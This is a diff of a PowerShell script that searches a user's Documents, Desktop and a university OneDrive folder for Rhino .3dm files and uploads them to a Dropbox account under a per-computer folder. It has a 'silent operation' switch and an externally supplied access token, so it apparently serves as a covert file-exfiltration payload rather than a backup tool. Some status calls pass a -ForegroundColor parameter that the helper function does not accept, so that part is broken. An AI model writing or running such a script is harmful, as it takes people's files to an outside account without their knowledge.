@@ -1,45 +1,72 @@
+# Debug configuration
+$debugMode = $true  # Set to $false for silent operation
+
+# Dropbox configuration
 $accessToken = $db
 $localFolders = @(
     "$env:USERPROFILE\Documents",
-    "$env:USERPROFILE\Desktop",
+    "$env:USERPROFILE\Desktop", 
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-$computerName = $env:COMPUTERNAME
-$dropboxFolderPath = "/$computerName"
-$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
-
-# Create computer folder in Dropbox
-$headers = @{
-    "Authorization" = "Bearer $accessToken"
-    "Content-Type" = "application/json"
+function Show-Status {
+    param($message)
+    if ($debugMode) {
+        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $message" -ForegroundColor Cyan
+    }
 }
-$body = @{
-    "path" = $dropboxFolderPath
-    "autorename" = $true
-} | ConvertTo-Json
-Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $body | Out-Null
 
-# Upload files
-$headers["Content-Type"] = "application/octet-stream"
-foreach ($folder in $localFolders) {
-    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
-        try {
-            $fileName = $_.Name
-            $dropboxPath = "$dropboxFolderPath/$fileName"
-            $fileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
+try {
+    # Initialize Dropbox connection
+    $computerName = $env:COMPUTERNAME
+    $dropboxFolderPath = "/$computerName"
+    $headers = @{
+        "Authorization" = "Bearer $accessToken"
+        "Content-Type" = "application/json"
+    }
+
+    Show-Status "Creating Dropbox folder: $dropboxFolderPath"
+    $body = @{ path = $dropboxFolderPath; autorename = $true } | ConvertTo-Json
+    Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $body | Out-Null
+
+    # File upload configuration
+    $headers["Content-Type"] = "application/octet-stream"
+    $totalFiles = 0
+
+    foreach ($folder in $localFolders) {
+        Show-Status "Searching: $folder"
+        $files = Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue
+        
+        foreach ($file in $files) {
+            $totalFiles++
+            $dropboxPath = "$dropboxFolderPath/$($file.Name)"
             
-            $headers["Dropbox-API-Arg"] = @{
-                "path" = $dropboxPath
-                "mode" = "add"
-                "autorename" = $true
-                "mute" = $false
-            } | ConvertTo-Json -Compress
-            
-            Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
-        }
-        catch {
-            # Silent error handling
+            try {
+                Show-Status "Uploading: $($file.Name)"
+                $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
+                
+                $headers["Dropbox-API-Arg"] = @{
+                    path = $dropboxPath
+                    mode = "add"
+                    autorename = $true
+                    mute = $false
+                } | ConvertTo-Json -Compress
+                
+                $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileBytes
+                Show-Status "Uploaded successfully!" -ForegroundColor Green
+            }
+            catch {
+                Show-Status "Failed to upload $($file.Name): $_" -ForegroundColor Red
+            }
         }
     }
+
+    Show-Status "Operation complete! Files processed: $totalFiles" -ForegroundColor Yellow
+    if ($debugMode) {
+        Start-Sleep -Seconds 30  # Keep window open for review
+    }
+}
+catch {
+    Show-Status "Critical error: $_" -ForegroundColor Red
+    Start-Sleep -Seconds 30
 }
